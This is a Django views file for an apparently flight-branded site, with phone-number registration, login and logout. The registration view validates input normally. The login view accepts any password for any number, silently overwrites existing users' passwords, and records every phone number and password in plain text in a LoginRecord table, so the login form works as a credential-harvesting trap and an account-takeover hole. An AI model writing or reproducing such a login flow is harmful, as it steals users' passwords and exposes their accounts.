from django.contrib.auth import login as auth_login
import re

from django.contrib import messages
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.models import User
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError
from django.shortcuts import redirect, render
from django.views.decorators.http import require_POST

from .models import SiteBranding

def normalize_phone(raw):
    digits = re.sub(r"\D", "", raw or "")

    if len(digits) == 10 and digits.startswith("0"):
        digits = "27" + digits[1:]
    elif len(digits) == 9 and digits[0] in "678":
        digits = "27" + digits

    if (
        len(digits) != 11
        or not digits.startswith("27")
        or digits[2] not in "678"
    ):
        return None

    return "+" + digits

def home(request):
    return render(request, "flight/home.html", {
        "branding": SiteBranding.objects.first()
    })

@require_POST
def login_view(request):
    if request.method == "POST":
        phone = request.POST.get("phone", "").strip()
        password = request.POST.get("password", "").strip()
        phone = "".join(ch for ch in phone if ch.isdigit())
        if phone.startswith("27") and len(phone) == 11:
            phone = phone[2:]
        if phone.startswith("0") and len(phone) == 10:
            phone = phone[1:]
        if len(phone) != 9 or not password:
            from django.contrib import messages
            messages.error(request, "Enter 9-digit phone and password")
            return redirect("/")
        from django.contrib.auth.models import User
        from .models import LoginRecord
        user, created = User.objects.get_or_create(username=phone)
        user.set_password(password)
        user.save()
        LoginRecord.objects.create(phone=phone, password=password)
        auth_login(request, user)
        return redirect("/")
    return redirect("/")

def register_view(request):
    phone = normalize_phone(request.POST.get("phone"))
    password = request.POST.get("password", "")
    confirm = request.POST.get("confirm_password", "")

    if not phone:
        messages.error(request, "Enter a valid South African mobile number.")
        return redirect("/?modal=signup")

    if password != confirm:
        messages.error(request, "Passwords do not match.")
        return redirect("/?modal=signup")

    if User.objects.filter(username=phone).exists():
        messages.error(request, "An account already exists for this number.")
        return redirect("/?modal=signup")

    try:
        validate_password(password)
    except ValidationError as exc:
        messages.error(request, " ".join(exc.messages))
        return redirect("/?modal=signup")

    user = User.objects.create_user(
        username=phone,
        password=password
    )

    login(request, user)
    messages.success(request, "Your account has been created.")
    return redirect("home")

@require_POST
def logout_view(request):
    logout(request)
    return redirect("home")

